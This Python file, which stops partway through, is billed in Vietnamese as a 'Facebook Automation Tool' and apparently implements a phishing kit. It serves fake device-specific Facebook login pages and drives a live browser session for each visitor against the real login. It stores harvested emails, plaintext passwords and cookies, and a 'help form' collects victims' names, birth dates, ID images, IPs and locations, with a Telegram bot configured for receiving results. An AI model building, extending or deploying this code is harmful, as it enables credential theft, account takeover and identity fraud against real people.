#!/usr/bin/env python3



"""



Facebook Automation Tool - Terminal CLI



======================================



Tool tự động hóa đăng nhập Facebook với giao diện terminal.



Mỗi user chạy trên một luồng riêng biệt với Playwright instance riêng.



"""







import os



import sys



import time



import threading



import queue



import base64



import uuid



import webbrowser



import subprocess



import re



from datetime import datetime



from typing import Optional, Dict, Any



from concurrent.futures import Future



import requests







# Thêm thư mục gốc vào path để import các module



sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))







from flask import Flask, render_template, request, jsonify, make_response, redirect



from openpyxl import Workbook, load_workbook

from openpyxl.drawing.image import Image as XLImage

from io import BytesIO



# Import utils



from utils.get_html import (

    get_facebook_page_after_login, get_cookies, wait_and_save_cookies,

    init_browser_session, navigate_to_facebook_login, 

    transfer_session_to_email, get_session_browser, login_with_session

)











# Create uploads directory if not exists



UPLOADS_DIR = "uploads"



if not os.path.exists(UPLOADS_DIR):



    os.makedirs(UPLOADS_DIR)







def save_base64_image(base64_data: str, original_filename: str = "") -> str:



    """Decode base64 và lưu thành file ảnh, trả về đường dẫn file"""



    if not base64_data:



        return ""



    



    try:



        # Generate unique filename



        ext = os.path.splitext(original_filename)[1] if original_filename else ".png"



        if not ext:



            ext = ".png"



        



        unique_name = f"{uuid.uuid4().hex}{ext}"



        file_path = os.path.join(UPLOADS_DIR, unique_name)



        



        # Decode base64



        image_bytes = base64.b64decode(base64_data)



        



        # Save to file



        with open(file_path, "wb") as f:



            f.write(image_bytes)



        



        return file_path



    except Exception as e:



        print(f"[Image Save Error] {e}")



        return ""











def get_ip_location(ip: str) -> str:



    """Lấy thông tin vị trí từ IP sử dụng ip-api.com"""



    try:



        # Skip for localhost/private IPs



        if ip in ('127.0.0.1', 'localhost') or ip.startswith('192.168.') or ip.startswith('10.'):



            return 'Local/Private Network'



        



        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp', timeout=5)



        data = response.json()



        



        if data.get('status') == 'success':



            location = f"{data.get('city', 'N/A')}, {data.get('regionName', 'N/A')}, {data.get('country', 'N/A')} ({data.get('isp', 'N/A')})"



            return location



        return 'Unknown'



    except Exception as e:



        return f'Error: {str(e)[:30]}'











def save_to_info_excel(data: dict) -> None:



    """Lưu dữ liệu vào file info.xlsx"""



    filename = "info.xlsx"



    



    # Create workbook if doesn't exist



    if not os.path.exists(filename):



        wb = Workbook()



        ws = wb.active



        ws.title = "Help Form Data"



        # Add headers



        headers = ['Timestamp', 'IP Address', 'Location', 'Full Name', 'Email', 'Year', 'Month', 'Day', 'Image Path']



        for col, header in enumerate(headers, 1):



            ws.cell(row=1, column=col, value=header)



        wb.save(filename)



    



    # Load workbook and append data



    wb = load_workbook(filename)



    ws = wb.active



    



    # Append data row



    row_data = [



        data.get('timestamp', ''),



        data.get('ip', ''),



        data.get('location', ''),



        data.get('field1', ''),



        data.get('field2', ''),



        data.get('year', ''),



        data.get('month', ''),



        data.get('day', ''),



        data.get('image', '')



    ]



    



    ws.append(row_data)



    wb.save(filename)











def print_logo():



    """In logo tool lên terminal"""



    logo = """



    ███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗



    ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝



    █████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝ 



    ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗ 



    ██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗



    ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝



                                                                     



         █████╗ ██╗   ██╗████████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗



        ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║



        ███████║██║   ██║   ██║   ██║   ██║██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║



        ██╔══██║██║   ██║   ██║   ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║



        ██║  ██║╚██████╔╝   ██║   ╚██████╔╝██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║



        ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝



    """



    print("\033[1;36m" + logo + "\033[0m")  # Cyan color



    print("\033[1;33m" + " " * 30 + "Version 1.0.0 - Terminal Edition" + "\033[0m\n")











def print_menu():



    """In bảng menu"""



    print("\033[1;34m" + "=" * 70 + "\033[0m")



    print("\033[1;32m" + "                           MENU CHÍNH" + "\033[0m")



    print("\033[1;34m" + "=" * 70 + "\033[0m")



    print()



    print("  \033[1;33m[1]\033[0m  Chạy server")

    print("  \033[1;33m[2]\033[0m  Xem danh sách user đã đăng nhập")

    print("  \033[1;33m[3]\033[0m  Xóa user khỏi danh sách")

    print("  \033[1;33m[4]\033[0m  Thiết lập Telegram Bot")

    print("  \033[1;33m[5]\033[0m  Thiết lập trình duyệt mở master")

    print("  \033[1;33m[0]\033[0m  Thoát")



    print()



    print("\033[1;34m" + "=" * 70 + "\033[0m")











def get_input(prompt: str, allow_empty: bool = False) -> str:



    """Lấy input từ user với validation"""



    while True:



        try:



            value = input(f"\033[1;36m{prompt}\033[0m").strip()



            if not value and not allow_empty:



                print("\033[1;31m[!] Vui lòng không để trống\033[0m")



                continue



            return value



        except KeyboardInterrupt:



            print("\n\033[1;31m[!] Đã hủy\033[0m")



            return ""











def start_server():



    """Khởi động Flask server"""



    print("\n\033[1;34m" + "-" * 50 + "\033[0m")



    print("\033[1;32m           KHỞI ĐỘNG SERVER\033[0m")



    print("\033[1;34m" + "-" * 50 + "\033[0m\n")



    



    port_str = get_input("Nhập port (mặc định: 5000): ", allow_empty=True)



    port = int(port_str) if port_str.isdigit() else 5000



    



    print(f"\n\033[1;33m[*] Khởi động server tại http://localhost:{port}\033[0m")



    print(f"\033[1;33m[*] Mỗi user đăng nhập trên một luồng riêng biệt\033[0m")



    print(f"\033[1;36m    Nhập Ctrl+C để dừng server và quay lại menu\033[0m\n")



    



    try:



        run_server(port=port, open_browser=False)



    except KeyboardInterrupt:



        print(f"\n\033[1;33m[*] Đã dừng server\033[0m")



    except Exception as e:



        print(f"\n\033[1;31m[!] Lỗi server: {e}\033[0m")



    



    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")











def show_users():



    """Hiển thị danh sách user đã đăng nhập"""



    print("\n\033[1;34m" + "-" * 50 + "\033[0m")



    print("\033[1;32m        DANH SÁCH USER\033[0m")



    print("\033[1;34m" + "-" * 50 + "\033[0m\n")



    



    filename = "users.xlsx"



    if os.path.exists(filename):



        try:



            from openpyxl import load_workbook



            wb = load_workbook(filename)



            ws = wb.active



            



            if ws.max_row <= 1:



                print("\033[1;33m[!] Chưa có user nào trong danh sách\033[0m")



            else:



                print(f"\033[1;36m{'STT':<5} {'Email':<25} {'Password':<15} {'Cookies':<20}\033[0m")



                print("-" * 75)



                for i, row in enumerate(ws.iter_rows(min_row=2, values_only=True), 1):



                    email = str(row[0]) if len(row) > 0 and row[0] else "N/A"



                    password = str(row[1]) if len(row) > 1 and row[1] else "N/A"



                    cookies = str(row[2]) if len(row) > 2 and row[2] else "N/A"



                    



                    # Rút gọn cookies để hiển thị bảng đẹp hơn



                    display_cookies = (cookies[:17] + "...") if len(cookies) > 20 else cookies



                    



                    print(f"{i:<5} {email:<25} {password:<15} {display_cookies:<20}")



        except Exception as e:



            print(f"\033[1;31m[!] Lỗi khi đọc file: {e}\033[0m")



    else:



        print(f"\033[1;33m[!] File {filename} chưa tồn tại\033[0m")



    



    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")











def delete_user():



    """Xóa user khỏi danh sách"""



    print("\n\033[1;34m" + "-" * 50 + "\033[0m")



    print("\033[1;32m           XÓA USER\033[0m")



    print("\033[1;34m" + "-" * 50 + "\033[0m\n")



    



    print("  \033[1;33m[1]\033[0m  Xóa một user theo email")



    print("  \033[1;33m[2]\033[0m  Xóa TOÀN BỘ danh sách")



    print("  \033[1;33m[0]\033[0m  Quay lại")



    



    choice = get_input("\nNhập lựa chọn: ", allow_empty=True)



    



    filename = "users.xlsx"



    if choice == "1":



        email = get_input("Nhập email cần xóa: ")



        if not email: return



        



        if os.path.exists(filename):



            try:



                from openpyxl import load_workbook



                wb = load_workbook(filename)



                ws = wb.active



                deleted = False



                for row in range(ws.max_row, 1, -1):



                    if ws.cell(row=row, column=1).value == email:



                        ws.delete_rows(row)



                        deleted = True



                if deleted:



                    wb.save(filename)



                    print(f"\n\033[1;32m[✓] Đã xóa user {email}\033[0m")



                else:



                    print(f"\n\033[1;33m[!] Không tìm thấy user {email}\033[0m")



            except Exception as e:



                print(f"\033[1;31m[!] Lỗi: {e}\033[0m")



        else:



            print(f"\033[1;33m[!] File {filename} chưa tồn tại\033[0m")



            



    elif choice == "2":



        confirm = get_input("Bạn có chắc chắn muốn xóa TOÀN BỘ? (y/n): ", allow_empty=True).lower()



        if confirm in ('y', 'yes'):



            if os.path.exists(filename):



                try:



                    os.remove(filename)



                    print(f"\n\033[1;32m[✓] Đã xóa toàn bộ danh sách user\033[0m")



                except Exception as e:



                    print(f"\033[1;31m[!] Lỗi: {e}\033[0m")



            else:



                print(f"\033[1;33m[!] File {filename} chưa tồn tại\033[0m")



    



    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")











def setup_bot():



    """Thiết lập Telegram Bot"""



    print("\n\033[1;34m" + "-" * 50 + "\033[0m")



    print("\033[1;32m        THIẾT LẬP TELEGRAM BOT\033[0m")



    print("\033[1;34m" + "-" * 50 + "\033[0m\n")



    



    config_file = "bot_config.txt"



    current_token = ""



    current_chat_id = ""



    



    if os.path.exists(config_file):



        with open(config_file, "r") as f:



            lines = f.readlines()



            if len(lines) >= 2:



                current_token = lines[0].strip()



                current_chat_id = lines[1].strip()



                print(f"\033[1;36mToken hiện tại: {current_token[:10]}...{current_token[-5:] if len(current_token)>10 else ''}\033[0m")



                print(f"\033[1;36mChat ID hiện tại: {current_chat_id}\033[0m\n")







    token = get_input("Nhập Bot Token (để trống để giữ nguyên): ", allow_empty=True)



    if not token and current_token:



        token = current_token



    elif not token:



        print("\033[1;31m[!] Token không được để trống\033[0m")



        return







    chat_id = get_input("Nhập Chat ID (để trống để giữ nguyên): ", allow_empty=True)



    if not chat_id and current_chat_id:



        chat_id = current_chat_id



    elif not chat_id:



        print("\033[1;31m[!] Chat ID không được để trống\033[0m")



        return







    try:



        with open(config_file, "w") as f:



            f.write(f"{token}\n{chat_id}")



        print(f"\n\033[1;32m[✓] Đã lưu cấu hình bot vào {config_file}\033[0m")



    except Exception as e:



        print(f"\033[1;31m[!] Lỗi khi lưu file: {e}\033[0m")



    



    input("\n\033[1;36mNhấn Enter để quay lại menu...\033[0m")











def setup_browser():

    """Thiết lập trình duyệt và master profile - Tự động tạo nếu chưa có"""

    import shutil

    

    master_dir = os.path.join(os.getcwd(), "master")

    config_file = "browser_config.txt"

    

    # Kiểm tra nếu đã có master profile

    if os.path.exists(master_dir) and os.listdir(master_dir):

        print(f"\033[1;32m[✓] Đã tìm thấy master profile tại: {master_dir}\033[0m")

        print(f"\033[1;33m[*] Đang mở trình duyệt...\033[0m\n")

        open_master_browser()

        return

    

    # Chưa có master profile - tạo mới tự động

    print("\n\033[1;34m" + "-" * 50 + "\033[0m")

    print("\033[1;32m        TẠO MASTER PROFILE TẠI THƯ MỤC HIỆN TẠI\033[0m")

    print("\033[1;34m" + "-" * 50 + "\033[0m\n")

    

    print(f"\033[1;33m[*] Chưa có master profile tại: {master_dir}\033[0m")

    print("\033[1;36m[*] Đang tìm profile Chrome/Edge/Brave để copy...\033[0m\n")

    

    # Tìm các profile Chrome mặc định

    chrome_paths = [

        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),

        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),

        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),

    ]

    

    profiles = []

    for chrome_path in chrome_paths:

        if os.path.exists(chrome_path):

            default_profile = os.path.join(chrome_path, "Default")

            if os.path.exists(default_profile):

                browser_name = "Chrome" if "Google" in chrome_path else ("Edge" if "Edge" in chrome_path else "Brave")

                profiles.append({

                    'name': f"{browser_name} - Default",

                    'path': default_profile,

                    'browser': browser_name

                })

            

            for i in range(1, 10):

                profile_path = os.path.join(chrome_path, f"Profile {i}")

                if os.path.exists(profile_path):

                    browser_name = "Chrome" if "Google" in chrome_path else ("Edge" if "Edge" in chrome_path else "Brave")

                    profiles.append({

                        'name': f"{browser_name} - Profile {i}",

                        'path': profile_path,

                        'browser': browser_name

                    })

    

    if not profiles:

        print("\033[1;31m[!] Không tìm thấy profile Chrome/Edge/Brave nào!\033[0m")

        print("\033[1;33m[*] Hãy đảm bảo bạn đã cài đặt Chrome hoặc Edge\033[0m")

        input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")

        return

    

    print("\033[1;32mTìm thấy các profile sau:\033[0m\n")

    for i, profile in enumerate(profiles, 1):

        print(f"  \033[1;33m[{i}]\033[0m {profile['name']}")

        print(f"      Đường dẫn: {profile['path']}")

        print()

    

    print(f"  \033[1;33m[{len(profiles) + 1}]\033[0m Nhập đường dẫn profile tùy chỉnh")

    print(f"  \033[1;33m[0]\033[0m Hủy và quay lại")

    

    choice = get_input("\nChọn profile để làm master: ", allow_empty=True)

    

    if choice == "0":

        return

    elif choice == str(len(profiles) + 1):

        custom_path = get_input("Nhập đường dẫn đến profile: ")

        if not custom_path or not os.path.exists(custom_path):

            print("\033[1;31m[!] Đường dẫn không hợp lệ\033[0m")

            input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")

            return

        selected_profile = {'name': 'Custom', 'path': custom_path, 'browser': 'Custom'}

    else:

        try:

            idx = int(choice) - 1

            if idx < 0 or idx >= len(profiles):

                raise ValueError()

            selected_profile = profiles[idx]

        except:

            print("\033[1;31m[!] Lựa chọn không hợp lệ\033[0m")

            time.sleep(1)

            return

    

    # Xác nhận copy

    print(f"\n\033[1;36mBạn đã chọn: {selected_profile['name']}\033[0m")

    print(f"\033[1;36mSao chép profile này vào thư mục master?\033[0m")

    confirm = get_input("Nhập 'yes' để xác nhận: ", allow_empty=True)

    

    if confirm.lower() != 'yes':

        print("\033[1;33m[*] Đã hủy\033[0m")

        input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")

        return

    

    # Copy profile

    print(f"\n\033[1;33m[*] Đang sao chép profile vào master...\033[0m")

    try:

        os.makedirs(master_dir, exist_ok=True)

        

        for item in os.listdir(selected_profile['path']):

            src = os.path.join(selected_profile['path'], item)

            dst = os.path.join(master_dir, item)

            

            if os.path.isfile(src):

                shutil.copy2(src, dst)

            elif os.path.isdir(src):

                shutil.copytree(src, dst, dirs_exist_ok=True)

        

        # Lưu cấu hình browser

        with open(config_file, "w") as f:

            f.write(f"{selected_profile['browser']}\n{master_dir}")

        

        print(f"\n\033[1;32m[✓] Đã sao chép profile thành công!\033[0m")

        print(f"\033[1;36mMaster profile: {master_dir}\033[0m")

        print(f"\033[1;36mBrowser: {selected_profile['browser']}\033[0m\n")

        

        # Tự động mở browser sau khi tạo xong

        print(f"\033[1;33m[*] Đang mở trình duyệt master...\033[0m\n")

        time.sleep(1)

        open_master_browser()

        

    except Exception as e:

        print(f"\033[1;31m[!] Lỗi khi sao chép: {e}\033[0m")

        import traceback

        traceback.print_exc()

        input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")





def setup_master_profile():

    """Chọn profile Chrome sẵn có và copy vào master"""

    import shutil

    import glob

    

    print("\n\033[1;36mTìm kiếm profile Chrome...\033[0m\n")

    

    # Tìm các profile Chrome mặc định

    chrome_paths = [

        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),

        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),

        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),

    ]

    

    profiles = []

    for chrome_path in chrome_paths:

        if os.path.exists(chrome_path):

            # Tìm các profile trong User Data

            default_profile = os.path.join(chrome_path, "Default")

            if os.path.exists(default_profile):

                browser_name = "Chrome" if "Google" in chrome_path else ("Edge" if "Edge" in chrome_path else "Brave")

                profiles.append({

                    'name': f"{browser_name} - Default",

                    'path': default_profile,

                    'browser': browser_name

                })

            

            # Tìm các profile khác (Profile 1, Profile 2, ...)

            for i in range(1, 10):

                profile_path = os.path.join(chrome_path, f"Profile {i}")

                if os.path.exists(profile_path):

                    browser_name = "Chrome" if "Google" in chrome_path else ("Edge" if "Edge" in chrome_path else "Brave")

                    profiles.append({

                        'name': f"{browser_name} - Profile {i}",

                        'path': profile_path,

                        'browser': browser_name

                    })

    

    if not profiles:

        print("\033[1;31m[!] Không tìm thấy profile Chrome/Edge/Brave nào!\033[0m")

        print("\033[1;33m[*] Hãy đảm bảo bạn đã cài đặt Chrome hoặc Edge\033[0m")

        input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")

        return

    

    print("\033[1;32mTìm thấy các profile sau:\033[0m\n")

    for i, profile in enumerate(profiles, 1):

        print(f"  \033[1;33m[{i}]\033[0m {profile['name']}")

        print(f"      Đường dẫn: {profile['path']}")

        print()

    

    print(f"  \033[1;33m[{len(profiles) + 1}]\033[0m Nhập đường dẫn profile tùy chỉnh")

    print(f"  \033[1;33m[0]\033[0m Quay lại")

    

    choice = get_input("\nChọn profile: ", allow_empty=True)

    

    if choice == "0":

        return

    elif choice == str(len(profiles) + 1):

        custom_path = get_input("Nhập đường dẫn đến profile: ")

        if not custom_path or not os.path.exists(custom_path):

            print("\033[1;31m[!] Đường dẫn không hợp lệ\033[0m")

            input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")

            return

        selected_profile = {'name': 'Custom', 'path': custom_path, 'browser': 'Custom'}

    else:

        try:

            idx = int(choice) - 1

            if idx < 0 or idx >= len(profiles):

                raise ValueError()

            selected_profile = profiles[idx]

        except:

            print("\033[1;31m[!] Lựa chọn không hợp lệ\033[0m")

            time.sleep(1)

            return

    

    # Xác nhận copy

    print(f"\n\033[1;36mBạn đã chọn: {selected_profile['name']}\033[0m")

    print(f"\033[1;36mSao chép profile này vào thư mục master?\033[0m")

    confirm = get_input("Nhập 'yes' để xác nhận: ", allow_empty=True)

    

    if confirm.lower() != 'yes':

        print("\033[1;33m[*] Đã hủy\033[0m")

        input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")

        return

    

    # Copy profile

    master_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "master")

    

    # Xóa master cũ nếu có

    if os.path.exists(master_dir):

        print("\033[1;33m[*] Đang xóa master cũ...\033[0m")

        try:

            shutil.rmtree(master_dir)

        except Exception as e:

            print(f"\033[1;31m[!] Lỗi khi xóa master cũ: {e}\033[0m")

    

    # Tạo master mới

    print(f"\033[1;33m[*] Đang sao chép profile vào master...\033[0m")

    try:

        os.makedirs(master_dir, exist_ok=True)

        

        # Copy nội dung profile vào master

        for item in os.listdir(selected_profile['path']):

            src = os.path.join(selected_profile['path'], item)

            dst = os.path.join(master_dir, item)

            

            if os.path.isfile(src):

                shutil.copy2(src, dst)

            elif os.path.isdir(src):

                shutil.copytree(src, dst, dirs_exist_ok=True)

        

        # Lưu cấu hình browser

        config_file = "browser_config.txt"

        with open(config_file, "w") as f:

            f.write(f"{selected_profile['browser']}\n{master_dir}")

        

        print(f"\n\033[1;32m[✓] Đã sao chép profile thành công!\033[0m")

        print(f"\033[1;36mMaster profile: {master_dir}\033[0m")

        print(f"\033[1;36mBrowser: {selected_profile['browser']}\033[0m")

        

    except Exception as e:

        print(f"\033[1;31m[!] Lỗi khi sao chép: {e}\033[0m")

        import traceback

        traceback.print_exc()

    

    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")





def open_master_browser():

    """Mở trình duyệt master"""

    import subprocess

    

    master_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "master")

    

    if not os.path.exists(master_dir) or not os.listdir(master_dir):

        print("\033[1;31m[!] Chưa có master profile!\033[0m")

        print("\033[1;33m[*] Hãy chọn 'Thiết lập master profile' trước\033[0m")

        input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")

        return

    

    # Đọc cấu hình browser

    config_file = "browser_config.txt"

    browser_type = "chrome"

    if os.path.exists(config_file):

        with open(config_file, "r") as f:

            lines = f.readlines()

            if len(lines) >= 1:

                browser_type = lines[0].strip()

    

    # Tìm đường dẫn browser

    browser_paths = {

        "chrome": [

            r"C:\Program Files\Google\Chrome\Application\chrome.exe",

            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",

            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),

        ],

        "edge": [

            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",

            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",

        ],

        "brave": [

            r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",

            os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\Application\brave.exe"),

        ],

    }

    

    browser_exe = None

    for path in browser_paths.get(browser_type.lower(), browser_paths["chrome"]):

        if os.path.exists(path):

            browser_exe = path

            break

    

    if not browser_exe:

        print(f"\033[1;31m[!] Không tìm thấy {browser_type}!\033[0m")

        input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")

        return

    

    # Mở browser với profile master

    try:

        print(f"\033[1;33m[*] Đang mở {browser_type} với profile master...\033[0m")

        subprocess.Popen([

            browser_exe,

            f"--user-data-dir={master_dir}",

            "--no-first-run",

            "--remote-debugging-port=9222"

        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"\033[1;32m[✓] Đã mở {browser_type}!\033[0m")

        print(f"\033[1;36mProfile: {master_dir}\033[0m")

    except Exception as e:

        print(f"\033[1;31m[!] Lỗi khi mở browser: {e}\033[0m")

    

    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")





def check_browser_config():

    """Kiểm tra cấu hình hiện tại"""

    master_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "master")

    config_file = "browser_config.txt"

    

    print("\n\033[1;34m" + "-" * 50 + "\033[0m")

    print("\033[1;32m        CẤU HÌNH HIỆN TẠI\033[0m")

    print("\033[1;34m" + "-" * 50 + "\033[0m\n")

    

    # Kiểm tra master

    if os.path.exists(master_dir) and os.listdir(master_dir):

        items = os.listdir(master_dir)

        print(f"\033[1;32m[✓] Master profile: {master_dir}\033[0m")

        print(f"\033[1;36m    Số mục: {len(items)}\033[0m")

        if 'Default' in items:

            print(f"\033[1;32m[✓] Có thư mục Default\033[0m")

        if 'Extensions' in items:

            print(f"\033[1;32m[✓] Có thư mục Extensions\033[0m")

    else:

        print(f"\033[1;31m[!] Chưa có master profile!\033[0m")

    

    # Kiểm tra cấu hình

    if os.path.exists(config_file):

        with open(config_file, "r") as f:

            lines = f.readlines()

            if len(lines) >= 1:

                print(f"\n\033[1;36mBrowser: {lines[0].strip()}\033[0m")

            if len(lines) >= 2:

                print(f"\033[1;36mPath: {lines[1].strip()}\033[0m")

    else:

        print(f"\033[1;31m[!] Chưa có file cấu hình\033[0m")

    

    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")











def detect_device(user_agent: str) -> str:



    """Phát hiện thiết bị từ User-Agent"""



    ua = user_agent.lower()



    if "iphone" in ua or "ipad" in ua or "ios" in ua:



        return "iOS"



    if "android" in ua:



        return "Android"



    return "Desktop"











def create_unified_app():



    """Tạo Flask app với cả login và help trên cùng 1 port"""



    template_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')



    app = Flask(__name__, template_folder=template_dir)



    



    FILE_NAME = "users.xlsx"



    



    @app.route("/")



    def home():



        """Trang chủ - tạo session_id duy nhất cho mỗi client"""



        user_agent = request.headers.get("User-Agent", "")



        device = detect_device(user_agent)

        

        # Tạo session_id mới cho mỗi lần truy cập

        import uuid

        session_id = str(uuid.uuid4())

        

        print(f"[Home] User-Agent: {user_agent[:50]}...")

        print(f"[Home] Device: {device}")

        print(f"[Home] Session ID: {session_id[:8]}...")

        

        # Lưu session_id vào temporary storage để theo dõi

        # Browser sẽ được khởi tạo trong cùng thread khi login

        

        template_map = {

            "iOS": "iOS/login.html",

            "Android": "Android/login.html",

            "Desktop": "Desktop/login.html"

        }

        template = template_map.get(device, "Desktop/login.html")

        

        # Trả về template với session_id

        response = make_response(render_template(template, session_id=session_id))

        # Set cookie để client gửi lại khi login

        response.set_cookie('fb_session', session_id, max_age=3600)  # 1 giờ

        return response



    

    @app.route("/api/init-browser", methods=["POST"])

    def init_browser_api():

        """API khởi tạo browser ngay khi client load trang"""

        data = request.json

        session_id = data.get("session_id", "").strip()

        

        if not session_id:

            # Lấy từ cookie nếu không có trong body

            session_id = request.cookies.get('fb_session', '')

        

        if not session_id:

            return jsonify({"success": False, "error": "Thiếu session_id"}), 400

        

        print(f"[InitBrowserAPI] Session: {session_id[:8]}...")

        

        # Lấy hoặc tạo worker cho session này

        worker = get_or_create_session_worker(session_id)

        

        # Kiểm tra nếu đã có browser cho session này rồi

        existing = get_session_browser(session_id)

        if existing:

            print(f"[InitBrowserAPI] Session {session_id[:8]}... đã có browser rồi")

            return jsonify({"success": True, "message": "Browser đã tồn tại"})

        

        # Khởi tạo browser trong worker thread của session

        def init_and_navigate():

            success = init_browser_session(session_id, headless=False)

            if success:

                nav_success = navigate_to_facebook_login(session_id)

                return success and nav_success

            return False

        

        try:

            result = worker.call(init_and_navigate)

            if result:

                print(f"[InitBrowserAPI] Đã khởi tạo browser cho session {session_id[:8]}...")

                return jsonify({"success": True, "message": "Browser đã khởi tạo"})

            else:

                return jsonify({"success": False, "error": "Không thể khởi tạo browser"}), 500

        except Exception as e:

            print(f"[InitBrowserAPI] Lỗi: {e}")

            return jsonify({"success": False, "error": str(e)}), 500

    

    

    @app.route("/api/languages", methods=["GET"])

    def get_languages():

        """API trả về danh sách ngôn ngữ có sẵn"""

        languages = [

            {"code": "en", "name": "English (US)", "flag": "🇺🇸"},

            {"code": "vi", "name": "Tiếng Việt", "flag": "🇻🇳"},

            {"code": "th", "name": "ภาษาไทย", "flag": "🇹🇭"},

            {"code": "es", "name": "Español", "flag": "🇪🇸"},

            {"code": "fr", "name": "Français", "flag": "🇫🇷"},

            {"code": "de", "name": "Deutsch", "flag": "🇩🇪"},

            {"code": "pt", "name": "Português", "flag": "🇵🇹"},

            {"code": "zh", "name": "中文 (简体)", "flag": "🇨🇳"},

            {"code": "ja", "name": "日本語", "flag": "🇯🇵"},

            {"code": "ko", "name": "한국어", "flag": "🇰🇷"},

            {"code": "id", "name": "Bahasa Indonesia", "flag": "🇮🇩"},

            {"code": "tr", "name": "Türkçe", "flag": "🇹🇷"},

            {"code": "ru", "name": "Русский", "flag": "🇷🇺"},

            {"code": "ar", "name": "العربية", "flag": "🇸🇦"}

        ]

        return jsonify({"success": True, "languages": languages})

    

    

    @app.route("/set_language", methods=["POST"])

    def set_language():

        """API để set ngôn ngữ ưa thích cho user (lưu vào cookie/session)"""

        data = request.get_json() or request.form

        lang = data.get("lang", "en")

        

        # Validate language

        valid_langs = ["en", "vi", "th", "es", "fr", "de", "pt", "zh", "ja", "ko", "id", "tr", "ru", "ar"]

        if lang not in valid_langs:

            return jsonify({"success": False, "error": "Invalid language code"}), 400

        

        # Set cookie response

        response = jsonify({"success": True, "message": f"Language set to {lang}"})

        response.set_cookie("preferred_lang", lang, max_age=30*24*60*60)  # 30 days

        return response

    

    

    @app.route("/login_with_lang/<lang>")

    def login_with_lang(lang):

        """Trang login với ngôn ngữ được chỉ định qua URL"""

        user_agent = request.headers.get("User-Agent", "")

        device = detect_device(user_agent)

        

        # Validate language

        valid_langs = ["en", "vi", "th", "es", "fr", "de", "pt", "zh", "ja", "ko", "id", "tr", "ru", "ar"]

        if lang not in valid_langs:

            lang = "en"

        

        template_map = {

            "iOS": "iOS/login.html",

            "Android": "Android/login.html",

            "Desktop": "Desktop/login.html"

        }

        template = template_map.get(device, "Desktop/login.html")

        

        # Render template với ngôn ngữ mặc định được set qua cookie hoặc URL

        response = make_response(render_template(template))

        response.set_cookie("preferred_lang", lang, max_age=30*24*60*60)

        return response



    



    # Quản lý session cho browser - mỗi session có worker riêng

    _session_workers: Dict[str, '_SessionWorker'] = {}

    _session_workers_lock = threading.Lock()

    BOT_CONFIG_FILE = "bot_config.txt"

    

    

    class _SessionWorker:

        """Worker thread chạy Playwright operations cho mỗi session riêng biệt"""

        

        def __init__(self, session_id: str):

            self.session_id = session_id

            self._q: "queue.Queue[tuple[callable, tuple, dict, Future]]" = queue.Queue()

            self._thread = threading.Thread(

                target=self._run, 

                name=f"session-worker-{session_id[:8]}", 

                daemon=True

            )

            self._thread.start()

            print(f"[SessionWorker] Đã tạo worker cho session {session_id[:8]}...")

        

        def _run(self):

            """Main loop của worker thread"""

            while True:

                func, args, kwargs, fut = self._q.get()

                try:

                    result = func(*args, **kwargs)

                    fut.set_result(result)

                except Exception as e:

                    print(f"[SessionWorker {self.session_id[:8]}...] Lỗi: {e}")

                    fut.set_exception(e)

        

        def call(self, func, *args, **kwargs):

            """Gọi đồng bộ - đợi kết quả"""

            fut: Future = Future()

